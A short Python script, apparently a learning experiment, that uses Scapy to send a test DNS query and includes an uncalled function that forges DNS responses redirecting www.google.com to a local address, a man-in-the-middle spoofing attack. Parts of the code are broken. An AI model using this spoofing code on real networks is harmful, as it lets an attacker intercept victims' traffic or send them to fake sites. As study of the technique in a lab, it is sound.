from scapy.all import *

def dns_req_test() : #This is creating a Standard Query Response. qr=1 indicates that it is a response. an=DNSRR(rrname='www.google.com', rdata='8.8.8.8')
    dns_packet2 = IP(dst='8.8.8.8') / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname='www.google.com'))
    dns_packet2.show()
    send(dns_packet2)
    
def sniff_test() : 
    pkt = sniff(filter='host 8.8.8.8', count=1, prn=lambda x: x.show())
    pkt[DNS].qr = 1
    pkt.show()
    # pkt[IP].dst = '192.168.178.22'
    # pkt[DNS].an = DNSRR(rrname='www.google.com', rdata='8.8.8.8')
    # pkt.show()
    # send(pkt)
    
def sniffPKT() :
    pkt = sniff()
    return pkt
    
def MIMspoofDNS(pkt) :
    EvilDNSResponse = IP() / UDP() / DNS()
    EvilDNSResponse[IP].dst = pkt[IP].src
    EvilDNSResponse[UDP].dport = pkt[UDP].dport
    EvilDNSResponse[DNS].rd = pkt[DNS].rd
    EvilDNSResponse[DNS].qd = pkt[DNS].qd
    EvilDNSResponse[DNS].qr = 1
    EvilDNSResponse[DNS].an = DNSRR(rrname = 'www.google.com', rdata='192.168.178.23')
    sendp(EvilDNSResponse)
    
        
    
    
def main() :
    dns_req_test()
    sniff_test()
    print("Test Success")

main()